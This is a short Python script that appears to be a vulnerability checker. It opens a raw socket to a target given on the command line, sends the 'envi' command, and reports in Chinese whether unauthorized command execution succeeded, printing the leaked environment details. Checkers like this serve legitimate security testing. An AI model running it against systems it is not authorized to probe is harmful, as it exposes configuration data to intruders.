#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import socket
import time
import json
import re
import random

urllib3.disable_warnings()


def verify(site):
    HOST, port = site.split("/")[2].split(":")
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        is_open = sock.connect_ex((HOST,int(port)))
        if is_open == 0:
            sock.send(str.encode("envi\n"))
            res = sock.recv(1024)
            sock.close()
            return res
    except:
        pass
    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，未授权执行 envi 命令的内容为：", info)
    else:
        print("[-]漏洞不存在")
